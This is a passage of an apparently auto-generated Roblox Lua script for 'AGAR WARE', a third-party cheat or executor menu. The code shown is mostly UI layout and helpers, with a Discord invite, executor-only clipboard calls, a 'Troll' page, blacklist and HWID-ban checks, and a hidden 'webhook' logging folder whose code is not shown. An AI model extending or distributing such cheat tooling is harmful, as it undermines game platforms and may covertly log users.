G2L["316"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["316"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["316"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.buttonFade.UIGradient
G2L["317"] = Instance.new("UIGradient", G2L["316"]);
G2L["317"]["Rotation"] = 90;
G2L["317"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.display.text
G2L["318"] = Instance.new("UIStroke", G2L["315"]);
G2L["318"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends
G2L["319"] = Instance.new("TextButton", G2L["314"]);
G2L["319"]["TextSize"] = 12;
G2L["319"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["319"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["319"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["319"]["Size"] = UDim2.new(0.5, 0, 1, 0);
G2L["319"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["319"]["Text"] = [[Show Friends]];
G2L["319"]["Name"] = [[friends]];
G2L["319"]["Position"] = UDim2.new(0.5, 0, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade
G2L["31a"] = Instance.new("CanvasGroup", G2L["319"]);
G2L["31a"]["Visible"] = false;
G2L["31a"]["BorderSizePixel"] = 0;
G2L["31a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31a"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31a"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["31a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31a"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.buttonFade.UIGradient
G2L["31b"] = Instance.new("UIGradient", G2L["31a"]);
G2L["31b"]["Rotation"] = 90;
G2L["31b"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownUsers.friends.text
G2L["31c"] = Instance.new("UIStroke", G2L["319"]);
G2L["31c"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling
G2L["31d"] = Instance.new("ScrollingFrame", G2L["309"]);
G2L["31d"]["Active"] = true;
G2L["31d"]["ZIndex"] = 999999999;
G2L["31d"]["BorderSizePixel"] = 0;
G2L["31d"]["Name"] = [[dropdownScrolling]];
G2L["31d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31d"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["31d"]["Size"] = UDim2.new(1, 0, 0.2, 0);
G2L["31d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31d"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["31d"]["ScrollBarThickness"] = 0;
G2L["31d"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.UIListLayout
G2L["31e"] = Instance.new("UIListLayout", G2L["31d"]);
G2L["31e"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button
G2L["31f"] = Instance.new("TextButton", G2L["31d"]);
G2L["31f"]["TextTransparency"] = 1;
G2L["31f"]["TextSize"] = 14;
G2L["31f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["31f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31f"]["BorderMode"] = Enum.BorderMode.Inset;
G2L["31f"]["Size"] = UDim2.new(1, 0, 0, 20);
G2L["31f"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["31f"]["Name"] = [[button]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.image
G2L["320"] = Instance.new("ImageLabel", G2L["31f"]);
G2L["320"]["ZIndex"] = 99;
G2L["320"]["BorderSizePixel"] = 0;
G2L["320"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["320"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["320"]["Size"] = UDim2.new(0, 20, 1, 0);
G2L["320"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["320"]["BackgroundTransparency"] = 1;
G2L["320"]["Name"] = [[image]];
G2L["320"]["Position"] = UDim2.new(1, -20, 0, 0);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text
G2L["321"] = Instance.new("TextLabel", G2L["31f"]);
G2L["321"]["ZIndex"] = 10;
G2L["321"]["BorderSizePixel"] = 0;
G2L["321"]["TextSize"] = 14;
G2L["321"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["321"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["321"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["321"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["321"]["BackgroundTransparency"] = 1;
G2L["321"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["321"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["321"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.UIPadding
G2L["322"] = Instance.new("UIPadding", G2L["321"]);
G2L["322"]["PaddingLeft"] = UDim.new(0, 6);


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.text.text
G2L["323"] = Instance.new("UIStroke", G2L["321"]);
G2L["323"]["Name"] = [[text]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade
G2L["324"] = Instance.new("CanvasGroup", G2L["31f"]);
G2L["324"]["Visible"] = false;
G2L["324"]["BorderSizePixel"] = 0;
G2L["324"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["324"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
G2L["324"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["324"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["324"]["Name"] = [[buttonFade]];


-- StarterGui.T5784YHRGE89ES98T.Dropdown.dropdownScrolling.button.buttonFade.UIGradient
G2L["325"] = Instance.new("UIGradient", G2L["324"]);
G2L["325"]["Rotation"] = 90;
G2L["325"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup
G2L["326"] = Instance.new("CanvasGroup", G2L["1"]);
G2L["326"]["Visible"] = false;
G2L["326"]["ZIndex"] = 1999999999;
G2L["326"]["BorderSizePixel"] = 0;
G2L["326"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["326"]["Size"] = UDim2.new(0, 450, 0, 80);
G2L["326"]["Position"] = UDim2.new(0.75448, 0, 0.67079, 0);
G2L["326"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["326"]["BackgroundTransparency"] = 1;


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel
G2L["327"] = Instance.new("TextLabel", G2L["326"]);
G2L["327"]["TextWrapped"] = true;
G2L["327"]["BorderSizePixel"] = 0;
G2L["327"]["TextSize"] = 14;
G2L["327"]["TextScaled"] = true;
G2L["327"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["327"]["FontFace"] = Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["327"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
G2L["327"]["BackgroundTransparency"] = 1;
G2L["327"]["RichText"] = true;
G2L["327"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["327"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["327"]["Text"] = [[AGAR WARE]];


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.intro
G2L["328"] = Instance.new("LocalScript", G2L["327"]);
G2L["328"]["Name"] = [[intro]];


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.TextLabel.UIStroke
G2L["329"] = Instance.new("UIStroke", G2L["327"]);
G2L["329"]["Thickness"] = 1.9;
G2L["329"]["Color"] = Color3.fromRGB(0, 54, 110);
G2L["329"]["LineJoinMode"] = Enum.LineJoinMode.Miter;


-- StarterGui.T5784YHRGE89ES98T.CanvasGroup.UIScale
G2L["32a"] = Instance.new("UIScale", G2L["326"]);
G2L["32a"]["Scale"] = 1.1;


-- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE
G2L["32b"] = Instance.new("Folder", G2L["1"]);
G2L["32b"]["Name"] = [[RandomShitHIDE]];


-- StarterGui.T5784YHRGE89ES98T.RandomShitHIDE.LabelsTags
G2L["32c"] = Instance.new("LocalScript", G2L["32b"]);
G2L["32c"]["Name"] = [[LabelsTags]];


-- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE
G2L["32d"] = Instance.new("Folder", G2L["1"]);
G2L["32d"]["Name"] = [[MOREMasterHIDE]];


-- StarterGui.T5784YHRGE89ES98T.MOREMasterHIDE.tcotoolrefresh
G2L["32e"] = Instance.new("LocalScript", G2L["32d"]);
G2L["32e"]["Name"] = [[tcotoolrefresh]];


-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE
G2L["32f"] = Instance.new("Folder", G2L["1"]);
G2L["32f"]["Name"] = [[WEBHOOOOOKSSSSSaaHIDE]];


-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
G2L["330"] = Instance.new("LocalScript", G2L["32f"]);
G2L["330"]["Name"] = [[global log]];


-- StarterGui.T5784YHRGE89ES98T.mainScript
local function C_2()
local script = G2L["2"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	local UserInputService = game:GetService("UserInputService")
	
	for _, frame in pairs(screenGui:GetChildren()) do
		if frame.Name == "MainFrame" and frame:FindFirstChild("itsthisone") then
			frame.Position = UDim2.new(0.5, 0, 0.5, 0)
			frame.AnchorPoint = Vector2.new(0.5, 0.5)
			frame.Active = true
	
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local dragging = false
			local dragStart, startPos
	
			local inputBeganConn, inputChangedConn, inputEndedConn
	
			local function setupDragging()
				if inputBeganConn then inputBeganConn:Disconnect() end
				if inputChangedConn then inputChangedConn:Disconnect() end
				if inputEndedConn then inputEndedConn:Disconnect() end
	
				local scale = uiScale and uiScale.Scale or 1
	
				if scale == 1 then
					frame.Draggable = true
				else
					frame.Draggable = false
	
					inputBeganConn = frame.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							dragging = true
							dragStart = input.Position
							startPos = frame.Position
						end
					end)
	
					inputChangedConn = UserInputService.InputChanged:Connect(function(input)
						if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
							local delta = input.Position - dragStart
							local currentScale = uiScale and uiScale.Scale or 1
							frame.Position = UDim2.new(
								startPos.X.Scale, 
								startPos.X.Offset + delta.X / currentScale, 
								startPos.Y.Scale, 
								startPos.Y.Offset + delta.Y / currentScale
							)
						end
					end)
	
					inputEndedConn = UserInputService.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							dragging = false
						end
					end)
				end
			end
	
			if uiScale then
				uiScale:GetPropertyChangedSignal("Scale"):Connect(setupDragging)
			end
			setupDragging()
			break
		end
	end
end;
task.spawn(C_2);
-- StarterGui.T5784YHRGE89ES98T.guicolor
local function C_3()
local script = G2L["3"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local gui = getScreenGui()
	if not gui then return end
	local colorFrame = gui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local function updateColors()
		local targetColor = colorFrame.BackgroundColor3
		for _, obj in pairs(gui:GetDescendants()) do
			if obj.Name == "GuiColor" then
				if obj:IsA("Frame") then
					obj.BackgroundColor3 = targetColor
				elseif obj:IsA("UIStroke") then
					obj.Color = targetColor
				end
			end
		end
	end
	
	updateColors()
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
		updateColors()
	end)
end;
task.spawn(C_3);
-- StarterGui.T5784YHRGE89ES98T.startupScript
local function C_4()
local script = G2L["4"];
	task.wait(1)
	_G.Notify("This script is still in alpha, join the discord to stay up to date!", 10)
	task.wait(3)
	_G.Notify("Thank you for using my script - agarvvoid", 5, 139308638407157)
	
	-- Owner join/leave detection
	local Players = game:GetService("Players")
	wait(0.5)
	
	Players.PlayerAdded:Connect(function(player)
		if _G.IsOwner(player.UserId) then
			_G.Notify("The owner of this script joined the server!", 8, 117934611310434)
		end
	end)
	
	Players.PlayerRemoving:Connect(function(player)
		if _G.IsOwner(player.UserId) then
			_G.Notify("The owner of this script left the server!", 8)
		end
	end)
	
	-- Check if owner is already in server
	for _, player in pairs(Players:GetPlayers()) do
		if _G.IsOwner(player.UserId) then
			_G.Notify("The owner of this script is in the server!", 8, 117934611310434)
		end
	end
end;
task.spawn(C_4);
-- StarterGui.T5784YHRGE89ES98T..
local function C_5()
local script = G2L["5"];
	-- Button click sound script (SINGLE SOUND INSTANCE)
	-- Put this as a LocalScript under your ScreenGui
	
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local soundId = 127989598863324
	
	-- Create ONE sound instance that stays loaded
	local clickSound = Instance.new("Sound")
	clickSound.SoundId = "rbxassetid://" .. soundId
	clickSound.Volume = 0.3
	clickSound.Parent = game:GetService("SoundService")
	
	-- Preload it
	clickSound:Play()
	clickSound:Stop()
	
	-- Function to add click sound to a button
	local function addClickSound(button)
		button.MouseButton1Click:Connect(function()
			clickSound:Play()
		end)
	end
	
	-- Add sound to all existing buttons
	for _, obj in pairs(screenGui:GetDescendants()) do
		if obj:IsA("TextButton") or obj:IsA("ImageButton") then
			addClickSound(obj)
		end
	end
	
	-- Add sound to any new buttons created later
	screenGui.DescendantAdded:Connect(function(obj)
		if obj:IsA("TextButton") or obj:IsA("ImageButton") then
			addClickSound(obj)
		end
	end)
end;
task.spawn(C_5);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.topbar.topbarScript
local function C_9()
local script = G2L["9"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local RunService = game:GetService("RunService")
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local MainFrame = screenGui:FindFirstChild("MainFrame")
	local MinimizeButton = script.Parent:FindFirstChild("minimise")
	local TitleText = script.Parent:FindFirstChild("text")
	
	if not MainFrame or not MinimizeButton or not TitleText then return end
	
	local InnerFrame = MainFrame:FindFirstChild("innerframe")
	local TopBar = MainFrame:FindFirstChild("topbar")
	
	local isMinimized = false
	local originalHeight = MainFrame.Size.Y.Offset
	
	local function toggleMinimize()
		isMinimized = not isMinimized
		if isMinimized then
			if InnerFrame then InnerFrame.Visible = false end
			local topBarHeight = TopBar and TopBar.Size.Y.Offset or 25
	
			-- Calculate offset to keep visual position same with center anchor
			local heightDiff = (originalHeight - topBarHeight) / 2
	
			MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, topBarHeight)
			MainFrame.Position = UDim2.new(
				MainFrame.Position.X.Scale, 
				MainFrame.Position.X.Offset, 
				MainFrame.Position.Y.Scale, 
				MainFrame.Position.Y.Offset - heightDiff
			)
			MinimizeButton.Text = "+"
		else
			if InnerFrame then InnerFrame.Visible = true end
	
			local topBarHeight = TopBar and TopBar.Size.Y.Offset or 25
			local heightDiff = (originalHeight - topBarHeight) / 2
	
			MainFrame.Size = UDim2.new(MainFrame.Size.X.Scale, MainFrame.Size.X.Offset, 0, originalHeight)
			MainFrame.Position = UDim2.new(
				MainFrame.Position.X.Scale, 
				MainFrame.Position.X.Offset, 
				MainFrame.Position.Y.Scale, 
				MainFrame.Position.Y.Offset + heightDiff
			)
			MinimizeButton.Text = "-"
		end
	end
	
	MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
	
	-- FPS Display
	local smoothedFPS = 60
	local smoothing = 0.05
	local lastTime = tick()
	
	RunService.RenderStepped:Connect(function()
		local now = tick()
		local deltaTime = now - lastTime
		lastTime = now
		local currentFPS = 1 / deltaTime
		smoothedFPS = smoothedFPS + (currentFPS - smoothedFPS) * smoothing
	
		-- Get ping
		local pingInSeconds = LocalPlayer:GetNetworkPing()
		local ping = math.round(pingInSeconds * 1000)
	
		-- Get server player count
		local playerCount = #Players:GetPlayers()
		local maxPlayers = Players.MaxPlayers
	
		-- Format the stats part with color
		local statsText = string.format(
			'<font color="rgb(180,180,180)">fps %.1f | %dms | server: %d/%d</font>',
			smoothedFPS,
			ping,
			playerCount,
			maxPlayers
		)
	
		TitleText.Text = "AGAR WARE | v3.0.0-alpha.5 | " .. statsText
		TitleText.RichText = true
	end)
end;
task.spawn(C_9);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.sidebar.sidebarScrolling.pagehandler
local function C_2a()
local script = G2L["2a"];
	-- Find ScreenGui
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	-- Get the target color from Color frame
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	local targetColor = colorFrame.BackgroundColor3
	
	local function updateAllColors()
		targetColor = colorFrame.BackgroundColor3
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
	
	-- Get references
	local buttonContainer = script.Parent
	local mainFrame = buttonContainer.Parent.Parent
	local contentArea = mainFrame:FindFirstChild("contentarea")
	if not contentArea then return end
	-- Page names
	local pageNames = {"Home", "Main", "Troll", "Settings", "TCOMain"}
	-- Colors
	local INACTIVE_BG = Color3.fromRGB(10, 10, 10)
	local ACTIVE_BG = Color3.fromRGB(20, 20, 20)
	local INACTIVE_TEXT = Color3.fromRGB(255, 255, 255)
	
	local currentPage = "Home"
	
	-- Function to switch pages
	local function switchPage(pageName)
		currentPage = pageName
		-- Hide all pages and reset all buttons
		for _, name in pageNames do
			local page = contentArea:FindFirstChild(name)
			if page then
				page.Visible = false
			end
			local button = buttonContainer:FindFirstChild(name)
			if button then
				button.BackgroundColor3 = INACTIVE_BG
				local text = button:FindFirstChild("text")
				if text then
					text.TextColor3 = INACTIVE_TEXT
					text.TextTransparency = 0
				end
			end
		end
		-- Show selected page
		local selectedPage = contentArea:FindFirstChild(pageName)
		if selectedPage then
			selectedPage.Visible = true
		end
		-- Highlight selected button
		local selectedButton = buttonContainer:FindFirstChild(pageName)
		if selectedButton then
			selectedButton.BackgroundColor3 = ACTIVE_BG
			local text = selectedButton:FindFirstChild("text")
			if text then
				text.TextColor3 = targetColor
				text.TextTransparency = 0
			end
		end
	end
	
	local function updateActivePageColor()
		local selectedButton = buttonContainer:FindFirstChild(currentPage)
		if selectedButton then
			local text = selectedButton:FindFirstChild("text")
			if text then
				text.TextColor3 = targetColor
			end
		end
	end
	
	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
		updateAllColors()
		updateActivePageColor()
	end)
	
	-- Connect all buttons
	for _, pageName in pageNames do
		local button = buttonContainer:FindFirstChild(pageName)
		if button then
			button.MouseButton1Click:Connect(function()
				switchPage(pageName)
			end)
		end
	end
	-- Set default page
	switchPage("Home")
end;
task.spawn(C_2a);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfoScript
local function C_45()
local script = G2L["45"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	_G.CreateButton({
		frame = "discord",
		groupbox = script,
		tooltip = "Join my discord server, press here to copy the link.",
		callback = function()
			local success = pcall(function()
				setclipboard("https://discord.gg/7fDasxV2Ht")
			end)
	
			if success then
				_G.Notify("Discord link copied to clipboard!", 3)
			else
				_G.Notify("Failed to copy link!", 3)
			end
	
			return success
		end,
		afterMessage = "Copied to clipboard!",
		errorMessage = "Failed to copy!",
		afterMessageWait = 2,
		canClickDuringAfter = false,
	})
end;
task.spawn(C_45);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Home.leftside.playerinfoTab.playerinfo.playerinfo
local function C_50()
local script = G2L["50"];
	local player = game.Players.LocalPlayer
	-- Get references to your UI elements
	local display = script.Parent.display
	local username = script.Parent.username
	local joindate = script.Parent.joindate
	local profile = script.Parent.profile
	local title = script.Parent.Parent["======TITLE======"].text
	-- Set display name
	display.Text = player.DisplayName
	-- Set username with @ format
	username.Text = "@" .. player.Name
	-- Get account creation date and calculate age
	local accountAge = player.AccountAge
	local currentDate = os.date("*t")
	local joinDate = os.date("*t", os.time() - (accountAge * 86400))
	-- Format: 🗓️ YYYY-MM-DD (X days)
	local formattedDate = string.format("🗓️ %04d-%02d-%02d (%d days)", 
		joinDate.year, 
		joinDate.month, 
		joinDate.day, 
		accountAge
	)
	joindate.Text = formattedDate
	-- Set profile picture
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	local content = game:GetService("Players"):GetUserThumbnailAsync(userId, thumbType, thumbSize)
	profile.Image = content
	profile.Visible = true
	-- Set title with display name
	title.Text = "Welcome, " .. player.DisplayName
end;
task.spawn(C_50);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.moreTab.moreScript
local function C_76()
local script = G2L["76"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	
	_G.CreateButton({
		frame = "destroygui",
		groupbox = script,
		tooltip = "Completely destroys the GUI and stops all scripts.",
		needsConfirm = true,
		confirmMessage = "Destroy GUI?",
		confirmWait = 0.7,
		callback = function()
			-- Disconnect ALL _G connections automatically
			for key, value in pairs(_G) do
				-- Disconnect RBXScriptConnection objects
				if type(value) == "userdata" and typeof(value) == "RBXScriptConnection" then
					pcall(function() value:Disconnect() end)
				end
				-- Cancel task threads
				if type(value) == "thread" then
					pcall(function() task.cancel(value) end)
				end
			end
	
			-- Clear all _G variables
			_G.CreateToggle = nil
			_G.CreateButton = nil
			_G.CreateButtonToggle = nil
			_G.CreateTextbox = nil
			_G.CreateSlider = nil
			_G.CreateDropdown = nil
			_G.CreateColorPicker = nil
			_G.Notify = nil
			_G.ShowTooltip = nil
			_G.HideTooltip = nil
			_G.ConfigData = nil
			_G.CenterColorPicker = nil
			_G.SetButtonText = nil
			_G.UserLists = nil
			_G.IsBlacklisted = nil
			_G.IsWhitelisted = nil
			_G.IsOwner = nil
			_G.IsHWIDBanned = nil
	
			-- Find and destroy the ScreenGui
			local function getScreenGui()
				local p = script.Parent
				while p do
					if p:IsA("ScreenGui") then return p end
					p = p.Parent
				end
			end
	
			local screenGui = getScreenGui()
			if screenGui then
				screenGui:Destroy()
			end
		end
	})
end;
task.spawn(C_76);
-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
local function C_8e()
local script = G2L["8e"];
	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
	
	local groupbox = script.Parent
	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
	local function getScreenGui()
		local p = groupbox
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	local screenGui = getScreenGui()
	if not screenGui then return end
	if uiListLayout then
		local function updateSize()
			local contentSize = uiListLayout.AbsoluteContentSize
			local uiScale = screenGui:FindFirstChildOfClass("UIScale")
			local scale = uiScale and uiScale.Scale or 1
			local scaledHeight = (contentSize.Y + 2) / scale
			groupbox.Size = UDim2.new(groupbox.Size.X.Scale, groupbox.Size.X.Offset, 0, scaledHeight)
		end
		uiListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateSize)
		local uiScale = screenGui:FindFirstChildOfClass("UIScale")
		if uiScale then
			uiScale:GetPropertyChangedSignal("Scale"):Connect(updateSize)
		end
		updateSize()
	end
	
	
	
	-- ====================================================================================================
	-- GROUPBOX/TAB CONFIGS
	-- ====================================================================================================
	
	
	-- ====================================================================================================
	-- TEXT SCALING
	-- ====================================================================================================
	-- Store original text sizes
	local originalSizes = {}
	
	_G.CreateSlider({
		frame = "textsize",
		groupbox = script,
		tooltip = "Adjust the text size. Default = 5",
		minvalue = 0,
		maxvalue = 10,
		default = 5,
		decimalplaces = 0,
		snap = true,
		callback = function(value)
			local screenGui = script.Parent
			while screenGui and not screenGui:IsA("ScreenGui") do
				screenGui = screenGui.Parent
			end
	
			if screenGui then
				for _, obj in pairs(screenGui:GetDescendants()) do
					if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
						-- Store original size on first run
						if not originalSizes[obj] then
							originalSizes[obj] = obj.TextSize
						end
	
						-- Calculate offset (5 = no change)
						local offset = value - 5
						obj.TextSize = originalSizes[obj] + offset
					end
				end
			end
		end
	})
	
	
	
	
	-- ====================================================================================================
	-- GUI SCALING
	-- ====================================================================================================
	_G.CreateTextbox({
		frame = "guisize",
		textboxname = "guisize",
		tooltip = "Scales the GUI size. Min = 0.70, Max = 2.50.",
		textboxcolor = "frameColor",
		hovercolor = true,
		callback = function(text)
			local value = tonumber(text)
	
			if not value then return end
	
			-- Clamp between 0.70 and 2.50
			value = math.clamp(value, 0.70, 2.50)
	
			-- Round to 2 decimals
			value = math.floor(value * 100 + 0.5) / 100
	
			-- Update textbox to show formatted value
			local p = script.Parent
			while p do
				if p:IsA("ScreenGui") then
					-- Find the textbox and update its display
					local frame = script.Parent:FindFirstChild("guisize")
					if frame then
						local textboxFrame = frame:FindFirstChild("guisize")
						if textboxFrame then
							local textbox = textboxFrame:FindFirstChild("textbox")
							if textbox then
								textbox.Text = string.format("%.2f", value)
							end
						end
					end
	
					-- Apply scale
					local uiScale = p:FindFirstChildOfClass("UIScale")
					if not uiScale then
						uiScale = Instance.new("UIScale")
						uiScale.Parent = p
					end
					uiScale.Scale = value
					break
				end
				p = p.Parent
			end
		end
	})
	
	-- Apply saved GUI scale on startup
	task.wait(0.1)
	local savedScale = _G.ConfigData["guisize_guisize"]
	if savedScale then
		local value = tonumber(savedScale)
		if value then
			value = math.clamp(value, 0.70, 2.50)
			value = math.floor(value * 100 + 0.5) / 100
	
			local p = script.Parent
			while p do
				if p:IsA("ScreenGui") then
					local uiScale = p:FindFirstChildOfClass("UIScale")
					if not uiScale then
